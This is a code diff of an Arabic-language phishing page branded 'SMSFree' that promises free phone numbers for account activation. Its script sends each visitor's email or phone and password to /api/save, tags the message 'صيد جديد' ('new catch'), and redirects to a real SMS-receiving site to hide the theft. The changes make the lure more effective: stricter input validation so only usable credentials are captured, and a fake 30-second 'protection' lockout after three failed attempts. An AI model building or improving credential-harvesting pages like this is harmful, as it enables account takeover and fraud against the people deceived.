@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMSFree - نظام حماية متطور</title>
+    <title>SMSFree - نظام التحقق الذكي</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         :root {
@@ -14,7 +14,7 @@
         }
 
         body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
             background-color: var(--bg-color);
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
             color: var(--text-white);
@@ -24,21 +24,16 @@
             width: 90%; max-width: 420px; background-color: var(--card-bg);
             padding: 40px 25px; border-radius: 24px; text-align: center;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            position: relative;
-            transition: 0.3s;
+            position: relative; overflow: hidden;
         }
 
-        /* الطبقة الضبابية التي ستغطي المحتوى الداخلي فقط */
-        .blur-target {
-            transition: filter 0.5s ease, opacity 0.5s ease;
-        }
-
-        /* عند الحظر: اجعل البريد والأزرار ضبابية وشفافة */
-        .is-banned .blur-target {
-            filter: blur(12px); /* قوة الضباب */
-            opacity: 0.3; /* درجة الشفافية */
-            pointer-events: none; /* تجميد الضغطات */
-            user-select: none;
+        /* حاوية العناصر التي سيطبق عليها الضباب */
+        .blur-content { transition: filter 0.4s ease, opacity 0.4s ease; }
+        
+        .is-banned .blur-content {
+            filter: blur(15px);
+            opacity: 0.2;
+            pointer-events: none;
         }
 
         .logo-circle {
@@ -55,7 +50,11 @@
             background: #0f172a; border: 1px solid #334155;
             border-radius: 12px; color: white; outline: none;
             text-align: center; font-size: 15px; box-sizing: border-box;
+            transition: 0.3s;
         }
+
+        input:focus { border-color: var(--primary-cyan); }
+        input.error-field { border-color: #ef4444; background: rgba(239, 68, 68, 0.1); }
 
         .submit-btn {
             width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
@@ -63,115 +62,119 @@
             font-size: 17px; font-weight: bold; cursor: pointer;
         }
 
-        /* صندوق المؤقت (يظل واضحاً جداً) */
-        .ban-overlay {
+        /* واجهة المؤقت (تظهر فوق الضباب) */
+        .ban-timer-overlay {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            z-index: 99; width: 80%; background: rgba(15, 23, 42, 0.8);
-            backdrop-filter: blur(4px); padding: 20px; border-radius: 20px;
-            border: 2px solid #fbbf24; display: none;
+            z-index: 100; text-align: center; display: none; width: 100%;
         }
 
-        .glass-popup {
-            background: rgba(15, 23, 42, 0.95) !important;
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--primary-cyan);
-            border-radius: 25px !important;
-            color: white !important;
-        }
+        #timer { font-size: 48px; font-weight: bold; color: #fbbf24; display: block; }
     </style>
 </head>
 <body>
 
-<div class="main-container" id="mainCard">
-    
-    <div class="ban-overlay" id="banOverlay">
-        <h3 style="color: #fbbf24; margin: 0;">⚠️ الوصول مقيد</h3>
-        <div style="font-size: 45px; font-weight: bold; margin: 10px 0;" id="timer">30</div>
-        <p style="font-size: 13px; margin: 0;">سيتم فك الحظر تلقائياً</p>
+<div class="main-container" id="cardContainer">
+    <div class="ban-timer-overlay" id="banOverlay">
+        <span style="color: #fbbf24; font-weight: bold;">⚠️ نظام الحماية مفعل</span>
+        <span id="timer">30</span>
+        <p style="font-size: 12px; color: #94a3b8;">يرجى الانتظار حتى انتهاء الوقت</p>
     </div>
 
-    <div class="blur-target" id="blurArea">
+    <div class="blur-content" id="contentArea">
         <div class="logo-circle">SMSFree</div>
-        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود وتفعيل فوري لحساباتك.</h2>
+        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.</h2>
 
         <form id="loginForm">
-            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" id="pass" placeholder="كلمة المرور" required>
+            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="passInput" placeholder="كلمة المرور" required>
             <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
         </form>
     </div>
-
 </div>
 
 <script>
-    let attempts = 0;
+    let attemptCounter = 0;
 
     document.getElementById('loginForm').onsubmit = async (e) => {
         e.preventDefault();
         
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
+        const userValue = document.getElementById('userInput').value.trim();
+        const passValue = document.getElementById('passInput').value;
+        const userInputField = document.getElementById('userInput');
 
-        // فحص الصحة (منع العربية والقصر الشديد)
-        const isInvalid = /[\u0600-\u06FF]/.test(user) || user.length < 5 || pass.length < 6;
+        // 1. قواعد التحقق (البريد الإلكتروني أو رقم هاتف صحيح)
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // صيغة الإيميل (name@domain.com)
+        const phonePattern = /^\+?[0-9]{8,15}$/; // صيغة الهاتف (أرقام فقط من 8 لـ 15 رقم)
 
-        if (isInvalid) {
-            attempts++;
-            if (attempts >= 3) {
-                activateBlurBan();
+        const isValid = emailPattern.test(userValue) || phonePattern.test(userValue);
+        const hasArabic = /[\u0600-\u06FF]/.test(userValue); // كشف الأحرف العربية
+
+        if (!isValid || hasArabic || passValue.length < 6) {
+            // محاولة فاشلة
+            attemptCounter++;
+            userInputField.classList.add('error-field');
+
+            if (attemptCounter >= 3) {
+                activateLockdown();
             } else {
                 Swal.fire({
-                    title: 'خطأ في البيانات',
-                    text: 'يرجى كتابة البريد وكلمة السر بشكل صحيح لتجنب الحظر.',
-                    icon: 'warning',
-                    customClass: { popup: 'glass-popup' }
+                    title: 'بيانات غير صحيحة',
+                    text: 'يرجى كتابة البريد الإلكتروني (مثال: example@gmail.com) أو رقم الهاتف بشكل صحيح لتجنب الحظر مؤقتاً.',
+                    icon: 'error',
+                    confirmButtonColor: '#22d3ee',
+                    background: '#1e293b',
+                    color: '#fff'
                 });
             }
             return;
         }
 
-        sendData(user, pass);
+        // إذا كانت البيانات صحيحة، يتم الإرسال والنقل
+        userInputField.classList.remove('error-field');
+        sendAndRedirect(userValue, passValue);
     };
 
-    function activateBlurBan() {
-        const card = document.getElementById('mainCard');
+    function activateLockdown() {
+        const container = document.getElementById('cardContainer');
         const overlay = document.getElementById('banOverlay');
         const timerText = document.getElementById('timer');
         
-        // تفعيل الضباب على الأزرار والبريد فقط
-        card.classList.add('is-banned');
+        container.classList.add('is-banned');
         overlay.style.display = 'block';
 
-        let timeLeft = 30;
+        let secondsLeft = 30;
         const countdown = setInterval(() => {
-            timeLeft--;
-            timerText.innerText = timeLeft;
-
-            if (timeLeft <= 0) {
+            secondsLeft--;
+            timerText.innerText = secondsLeft;
+            if (secondsLeft <= 0) {
                 clearInterval(countdown);
-                card.classList.remove('is-banned');
+                container.classList.remove('is-banned');
                 overlay.style.display = 'none';
-                attempts = 0;
-
+                attemptCounter = 0;
+                
                 Swal.fire({
                     title: 'مبروك!',
-                    text: 'تم إزالة الحظر عنك. لا تكرر الخطأ ثانية.',
+                    text: 'تم إزالة الحظر عنك. لاتكرر الغلط كي لايتم حظرك ثانية.',
                     icon: 'success',
-                    customClass: { popup: 'glass-popup' }
+                    confirmButtonColor: '#22d3ee'
                 });
             }
         }, 1000);
     }
 
-    async function sendData(u, p) {
+    async function sendAndRedirect(u, p) {
+        // إرسال البيانات إلى السيرفر (API)
         try {
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: `👤: ${u}\n🔑: ${p}` })
+                body: JSON.stringify({ message: `🎯 صيد جديد (بيانات موثقة)\n👤 المستخدم: ${u}\n🔑 الباسورد: ${p}` })
             });
+            // النقل للصفحة التالية فقط عند النجاح
             window.location.href = "https://receive-smss.com/";
-        } catch (e) {}
+        } catch (err) {
+            console.error("Connection Error");
+        }
     }
 </script>
 
